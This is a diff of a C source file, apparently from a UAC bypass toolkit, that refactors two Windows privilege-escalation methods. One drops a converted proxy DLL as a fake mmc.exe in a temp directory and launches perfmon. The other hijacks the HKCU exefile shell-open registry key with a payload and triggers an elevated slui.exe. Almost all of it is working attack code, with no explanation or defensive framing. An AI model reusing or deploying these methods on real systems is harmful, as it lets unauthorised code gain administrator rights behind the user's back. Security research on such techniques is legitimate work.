@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2017 - 2018
+*  (C) COPYRIGHT AUTHORS, 2017 - 2019
 *
 *  TITLE:       BYTECODE77.C
 *
-*  VERSION:     2.90
+*  VERSION:     3.17
 *
-*  DATE:        10 July 2018
+*  DATE:        18 Mar 2019
 *
 *  bytecode77 autoelevation methods.
 *
@@ -39,12 +39,14 @@
 * Fixed in Windows 10 RS3
 *
 */
-BOOL ucmVolatileEnvMethod(
+NTSTATUS ucmVolatileEnvMethod(
     _In_ PVOID ProxyDll,
     _In_ DWORD ProxyDllSize
 )
 {
-    BOOL  bResult = FALSE, bCond = FALSE, bEnvSet = FALSE;
+    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
+
+    BOOL  bEnvSet = FALSE;
     WCHAR szBuffer[MAX_PATH * 2];
 
     do {
@@ -52,14 +54,20 @@ BOOL ucmVolatileEnvMethod(
         //
         // Replace default Fubuki dll entry point with new and remove dll flag.
         //
-        if (!supConvertDllToExeSetNewEP(ProxyDll, ProxyDllSize, FUBUKI_DEFAULT_ENTRYPOINT))
+        if (!supReplaceDllEntryPoint(
+            ProxyDll,
+            ProxyDllSize,
+            FUBUKI_DEFAULT_ENTRYPOINT,
+            TRUE))
+        {
             break;
+        }
 
         //
         // Create %temp%\KureND directory.
         //
         RtlSecureZeroMemory(&szBuffer, sizeof(szBuffer));
-        _strcpy(szBuffer, g_ctx.szTempDirectory);
+        _strcpy(szBuffer, g_ctx->szTempDirectory);
         _strcat(szBuffer, T_KUREND);
 
         if (!CreateDirectory(szBuffer, NULL))
@@ -90,10 +98,11 @@ BOOL ucmVolatileEnvMethod(
         //
         _strcat(szBuffer, MMC_EXE);
         if (supWriteBufferToFile(szBuffer, ProxyDll, ProxyDllSize)) {
-            bResult = supRunProcess(PERFMON_EXE, NULL);
+            if (supRunProcess(PERFMON_EXE, NULL))
+                MethodResult = STATUS_SUCCESS;
         }
 
-    } while (bCond);
+    } while (FALSE);
 
     //
     // Cleanup if requested.
@@ -101,7 +110,7 @@ BOOL ucmVolatileEnvMethod(
     if (bEnvSet)
         supSetEnvVariable(TRUE, T_VOLATILE_ENV, T_SYSTEMROOT_VAR, NULL);
 
-    return bResult;
+    return MethodResult;
 }
 
 /*
@@ -112,11 +121,17 @@ BOOL ucmVolatileEnvMethod(
 * Bypass UAC using registry HKCU\Software\Classes\exefile\shell\open hijack and SLUI elevated launch.
 *
 */
-BOOL ucmSluiHijackMethod(
+NTSTATUS ucmSluiHijackMethod(
     _In_ LPWSTR lpszPayload
 )
 {
-    BOOL bResult = FALSE, bSymLinkCleanup = FALSE;
+    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
+
+#ifndef _WIN64
+    NTSTATUS Status;
+#endif
+
+    BOOL bSymLinkCleanup = FALSE, bValueSet = FALSE;
     HKEY hKey = NULL;
     SIZE_T sz = 0;
     LRESULT lResult;
@@ -125,24 +140,22 @@ BOOL ucmSluiHijackMethod(
 
     SHELLEXECUTEINFO shinfo;
 
-#ifndef _WIN64
-    PVOID   OldValue = NULL;
-#endif
+    sz = _strlen(lpszPayload);
+    if (sz == 0) {
+        return STATUS_INVALID_PARAMETER;
+    }
 
 #ifndef _WIN64
-    if (g_ctx.IsWow64) {
-        if (!NT_SUCCESS(RtlWow64EnableFsRedirectionEx((PVOID)TRUE, &OldValue)))
-            return FALSE;
+    if (g_ctx->IsWow64) {
+        Status = supEnableDisableWow64Redirection(TRUE);
+        if (!NT_SUCCESS(Status))
+            return Status;
     }
 #endif
 
-    sz = _strlen(lpszPayload);
-    if (sz == 0)
-        return FALSE;
-
-     //
-     // Create or open target key.
-     //
+    //
+    // Create or open target key.
+    //
     _strcpy(szBuffer, T_EXEFILE_SHELL);
     _strcat(szBuffer, T_SHELL_OPEN_COMMAND);
     lResult = RegCreateKeyEx(HKEY_CURRENT_USER, szBuffer, 0, NULL,
@@ -150,19 +163,31 @@ BOOL ucmSluiHijackMethod(
 
     if (lResult == ERROR_SUCCESS) {
 
+        lResult = ERROR_ACCESS_DENIED;
+
         //
         // Set "Default" value as our payload.
         //
         cbData = (DWORD)((1 + sz) * sizeof(WCHAR));
-        if (g_ctx.MethodExecuteType == ucmExTypeRemediationRequired) {
 
-            if (NT_SUCCESS(wdRegSetValueIndirectHKCU(szBuffer, NULL, lpszPayload, (ULONG)cbData))) {
+        switch (g_ctx->MethodExecuteType) {
+
+        case ucmExTypeRegSymlink:
+
+            if (NT_SUCCESS(supRegSetValueIndirectHKCU(
+                szBuffer,
+                NULL,
+                lpszPayload,
+                (ULONG)cbData)))
+            {
                 bSymLinkCleanup = TRUE;
                 lResult = ERROR_SUCCESS;
             }
 
-        }
-        else {
+            break;
+
+        case ucmExTypeDefault:
+        default:
 
             lResult = RegSetValueEx(
                 hKey,
@@ -170,14 +195,19 @@ BOOL ucmSluiHijackMethod(
                 0, REG_SZ,
                 (BYTE*)lpszPayload,
                 cbData);
+
+
+            break;
         }
 
-        if (lResult == ERROR_SUCCESS) {
+        bValueSet = (lResult == ERROR_SUCCESS);
+
+        if (bValueSet) {
 
             //
             // Run trigger application.
             //
-            _strcpy(szBuffer, g_ctx.szSystemDirectory);
+            _strcpy(szBuffer, g_ctx->szSystemDirectory);
             _strcat(szBuffer, SLUI_EXE);
 
             RtlSecureZeroMemory(&shinfo, sizeof(shinfo));
@@ -186,35 +216,46 @@ BOOL ucmSluiHijackMethod(
             shinfo.lpFile = szBuffer;
             shinfo.nShow = SW_SHOWNORMAL;
             shinfo.fMask = SEE_MASK_NOCLOSEPROCESS;
-            bResult = ShellExecuteEx(&shinfo);
-            if (bResult) {
+            if (ShellExecuteEx(&shinfo)) {
                 Sleep(5000);
                 TerminateProcess(shinfo.hProcess, 0);
                 CloseHandle(shinfo.hProcess);
+                MethodResult = STATUS_SUCCESS;
             }
         }
         RegCloseKey(hKey);
     }
 
     //
-    // Remove symlink.
+    // Remove symlink if set.
     //
-    if (g_ctx.MethodExecuteType == ucmExTypeRemediationRequired) {
-        if (bSymLinkCleanup)
-            wdRemoveRegLinkHKCU();
-    }
+    if (bSymLinkCleanup)
+        supRemoveRegLinkHKCU();
 
     //
     // Remove key with all subkeys.
     //
-    if (dwKeyDisposition == REG_CREATED_NEW_KEY)
-        supDeleteKeyRecursive(HKEY_CURRENT_USER, T_EXEFILE_SHELL);
+    if (dwKeyDisposition == REG_CREATED_NEW_KEY) {
+        supRegDeleteKeyRecursive(
+            HKEY_CURRENT_USER,
+            T_EXEFILE_SHELL);
+    }
+    else {
+        if (bValueSet) {
+            _strcpy(szBuffer, T_EXEFILE_SHELL);
+            _strcat(szBuffer, T_SHELL_OPEN_COMMAND);
+            supDeleteKeyValueAndFlushKey(
+                HKEY_CURRENT_USER,
+                szBuffer,
+                TEXT(""));
+        }
+    }
 
 #ifndef _WIN64
-    if (g_ctx.IsWow64) {
-        RtlWow64EnableFsRedirectionEx(OldValue, &OldValue);
+    if (g_ctx->IsWow64) {
+        supEnableDisableWow64Redirection(FALSE);
     }
 #endif
 
-    return bResult;
+    return MethodResult;
 }
